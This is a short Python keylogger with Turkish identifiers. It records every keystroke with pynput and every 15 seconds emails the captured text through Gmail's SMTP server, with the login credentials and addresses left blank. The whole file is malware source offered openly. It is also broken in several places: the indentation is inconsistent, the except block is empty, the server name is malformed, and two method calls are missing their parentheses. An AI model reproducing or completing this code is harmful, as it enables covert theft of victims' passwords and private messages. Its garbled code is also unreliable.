
import pynput.keyboard
import smtplib
import threading
toplama = "Keylogger Başlatılıyor..."

def emir(harfler):
    global toplama
    print("====================")
    try :
        toplama += str(harfler.char)
    except AttributeError:
    if harfler==harfler.space:
        toplama += " "
   elif harfler == harfler.backspace:
          sayı = len(toplama)
          print(sayı)
          sayı -= 1
          print(toplama[sayı])
          değer=0
          sonuç = " "
          while sayı>değer:
            sonuç += toplama[değer]
            değer +=1
        toplama = sonuç
    elif harfler==harfler.enter:
        toplama += "\n"
    else:
            toplama += str(harfler)
        print(toplama)

def mail_gönder(mesaj):
    global toplama
    server = smtplib.SMTP("smtp gmail.com:587")
    server.starttls
    server.login("","")
    server.sendmail("e-posta","e-posta",mesaj)
    server.quit()

def dallanma():
    global toplama
    if toplama: 
         mail_gönder(toplama)
       toplama = " "
    timer = threading.Timer(15,dallanma)
    timer.start()





Dinleme = pynput.keyboard.Listener(on_press=emir)

with Dinleme:
    dallanma()
    Dinleme.join







